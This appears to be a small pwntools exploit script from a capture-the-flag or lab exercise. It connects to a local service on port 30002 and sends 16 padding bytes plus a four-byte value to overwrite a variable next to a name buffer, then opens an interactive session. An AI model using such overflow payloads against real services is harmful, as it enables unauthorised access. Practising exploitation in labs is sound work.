from pwn import *

ADDR = '127.0.0.1'
PORT = 30002

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16
payload += b'\x01\x00\x00\x00'

io.sendline(payload)
io.interactive()